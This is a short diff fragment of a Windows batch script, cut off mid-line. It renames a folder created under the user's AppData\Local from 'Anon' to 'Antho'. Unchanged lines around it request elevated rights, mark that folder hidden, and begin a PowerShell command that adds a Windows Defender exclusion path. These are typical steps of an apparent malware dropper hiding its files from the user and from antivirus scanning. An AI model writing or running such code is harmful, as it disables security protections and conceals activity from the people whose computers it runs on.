@@ -27,7 +27,7 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 
 cd "C:\Users\%USERNAME%\AppData\Local"
-mkdir "Anon"
+mkdir "Antho"
 attrib +h "Antho" /s /d
 
 powershell.exe -command "Add-MpPreference -ExclusionPath "C:\
